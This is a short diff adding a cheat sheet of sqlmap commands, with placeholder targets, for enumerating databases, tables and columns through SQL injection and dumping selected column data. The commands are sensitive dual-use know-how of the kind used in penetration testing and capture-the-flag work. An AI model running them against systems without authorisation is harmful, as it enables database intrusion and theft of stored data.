@@ -1,0 +1,7 @@
+--- use sqlmap ---
+
+- sqlmap -u <URL> --dbs //show databases
+- sqlmap -u <URL> -D <DATABASE> --tables //show tables
+- sqlmap -u <URL> -D <DATABASE> --tables -T <table> --columns //show structure on this table
+- sqlmap -u <URL> -D <DATABASE> --tables -T <table> --columns -C <fied columns>, <fied columns> --dump // select <fied columns>
+- sqlmap -u <URL> --dbms=<MySql> --level=5 --risk=3 --current-db
